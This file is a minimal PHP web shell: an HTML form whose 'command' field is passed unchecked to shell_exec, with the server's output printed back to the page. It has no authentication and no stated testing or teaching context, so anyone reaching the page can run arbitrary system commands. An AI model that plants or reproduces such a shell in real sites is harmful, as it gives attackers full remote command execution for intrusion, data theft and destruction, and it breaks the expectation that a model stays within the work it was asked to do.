<html>
  <head>
  </head>
    <body>
      <form method="post" action="">
        <input type="text" name="command" placeholder="Enter command">
        <input type="submit" value="Execute">
      </form>
      <?php
if(isset($_POST['command'])) {
    $command = $_POST['command'];
    echo "<pre>".shell_exec($command)."</pre>";
}
     ?>
   </body>
</html>